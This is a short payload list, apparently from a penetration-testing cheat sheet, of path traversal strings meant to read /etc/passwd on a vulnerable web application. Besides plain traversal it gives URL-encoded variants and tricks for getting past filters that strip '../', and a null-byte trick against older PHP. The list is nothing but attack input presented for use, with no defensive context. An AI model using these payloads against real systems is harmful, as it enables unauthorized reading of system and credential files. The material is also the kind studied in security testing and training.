##### 
Try: 
```
/etc/passwd
../../../../etc/passwd
%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
.././.././.././../etc/passwd  (Bypass "../.." filter)
%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2Fetc%2Fpasswd
....//....//....//....//....//etc/passwd  (Bypass removing "../")
%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2Fetc%2Fpasswd
%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd%00 (Bypass extensions with a NULL byte, PHP < 5.3.4)
../../../../etc/./passwd


```